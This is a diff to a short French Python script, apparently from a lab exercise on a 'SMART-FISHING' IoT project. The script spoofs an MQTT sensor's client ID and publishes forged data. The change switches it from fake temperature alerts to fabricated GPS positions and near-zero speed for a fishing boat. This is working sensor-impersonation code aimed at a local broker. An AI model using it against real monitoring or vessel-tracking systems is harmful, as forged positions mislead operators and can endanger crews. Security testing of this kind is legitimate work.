@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Script de Spoofing MQTT — SMART-FISHING
-Usurpe l'identité d'un capteur légitime et publie de fausses données
+Usurpe l'identité d'un capteur GPS légitime et publie une fausse position
 """
 
 import paho.mqtt.client as mqtt
@@ -14,8 +14,8 @@ BROKER = "localhost"
 PORT = 1883
 
 # Identifiants du capteur légitime (à adapter après sniffing)
-CLIENT_ID = "capteur_TEMP_001"
-TOPIC = "fishing/boat/ABJ-001/temperature"
+CLIENT_ID = "capteur_GPS_001"
+TOPIC = "fishing/boat/BT-Abi-01/gps"
 
 def on_connect(client, userdata, flags, rc):
     """Callback lors de la connexion au broker"""
@@ -43,19 +43,20 @@ client.connect(BROKER, PORT, 60)
 client.loop_start()
 time.sleep(1)
 
-# Publier 5 messages falsifiés
-print("\n[*] Publication de 5 messages falsifiés...")
+# Publier 5 messages GPS falsifiés
+print("\n[*] Publication de 5 positions GPS falsifiées...")
 for i in range(5):
     payload = {
-        "capteur_id": "TEMP-001",
-        "valeur": round(random.uniform(40.0, 45.0), 2),  # Température anormale
-        "unite": "C",
+        "capteur_id": "GPS-001",
+        "lat": round(random.uniform(4.0, 4.5), 5),   # Position falsifiée, loin de la zone réelle
+        "lng": round(random.uniform(-8.0, -7.5), 5), # ex: au large, hors zone de pêche habituelle
+        "vitesse": round(random.uniform(0.0, 2.0), 1),  # Vitesse quasi nulle suspecte (ex: bateau à la dérive)
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-        "alerte": "CRITIQUE",
+        "alerte": "POSITION_ANORMALE",
         "source": "spoofing"
     }
     client.publish(TOPIC, json.dumps(payload))
-    print(f"[{i+1}/5] Publié: {payload['valeur']}°C (alerte critique)")
+    print(f"[{i+1}/5] Publié: lat={payload['lat']}, lng={payload['lng']} (position falsifiée)")
     time.sleep(2)
 
 client.loop_stop()
